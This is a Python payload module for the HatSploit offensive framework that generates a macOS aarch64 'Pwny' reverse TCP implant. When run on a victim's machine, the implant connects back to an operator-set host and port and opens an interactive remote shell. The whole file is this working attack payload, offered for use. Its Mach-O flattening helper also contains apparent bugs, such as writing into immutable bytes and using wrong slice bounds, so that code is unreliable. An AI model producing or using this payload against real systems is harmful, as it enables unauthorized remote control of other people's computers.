
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import lief

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "macOS aarch64 Pwny Reverse TCP",
            'Payload': "macos/aarch64/pwny_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive Pwny shell for macOS "
                "with AARCH64 architecture."
            ),
            'Arch': ARCH_AARCH64,
            'Platform': OS_MACOS,
            'Session': PwnySession,
            'Type': REVERSE_TCP,
        })

    @staticmethod
    def flatten_macho(data):
        macho = lief.MachO.parse(data)
        min_addr = -1
        max_addr = 0

        for segment in macho.segments:
            if segment.name == '__PAGEZERO':
                if min_addr == -1 or min_addr > segment.virtual_address:
                    min_addr = segment.virtual_address

                if max_addr < segment.virtual_address + segment.virtual_size:
                    max_addr = segment.virtual_address + segment.virtual_size

        flat = b'\x00' * (max_addr - min_addr)

        for segment in macho.segments:
            for section in segment.sections:
                flat_addr = section.virtual_address
                flat_data = data[section.offset:section.size]

                if flat_data:
                    flat[flat_addr:len(flat_data)] = flat_data

        return flat

    def run(self):
        return Pwny(
            target='aarch64-apple-darwin',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
